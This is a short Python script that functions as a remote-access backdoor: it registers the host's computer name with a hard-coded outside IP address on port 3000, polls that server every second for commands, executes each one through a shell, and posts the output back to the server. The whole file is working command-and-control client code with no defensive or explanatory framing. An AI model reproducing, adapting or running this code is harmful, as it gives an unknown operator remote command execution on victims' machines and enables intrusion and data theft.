import requests
import json
import subprocess
import os
import time

HOST = "http://141.164.63.158:3000";

def add():
  name = os.environ['COMPUTERNAME']

  params = { 'name': name }
  requests.get(f"{HOST}/add", params=params)

def fetch():
  name = os.environ['COMPUTERNAME']

  params = { 'name': name }
  r = requests.get(f"{HOST}/fetch", params=params)

  cmds = json.loads(r.text)

  for cmd in cmds:
    execute(cmd)

def execute(command):
  type = command['type']

  print(f"[INFO] executed {type}")
  if type == "command":
    data = command['cmdData']
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = proc.stdout.read()
    err = proc.stderr.read()
    # print(out)
    out = out.decode("utf-8")
    err = err.decode("utf-8")

    if out == "": out = err

    data = {
      'target': command['target'],
      'type': type,
      'uid': command['uid'],
      'res': out,
    }

    requests.post(f'{HOST}/res', data=data)

def main():
  add()
  while True:
    time.sleep(1)
    fetch()
    # try:
    #   fetch()
    # except Exception as e:
    #   print(e)


if __name__ == "__main__":
  main()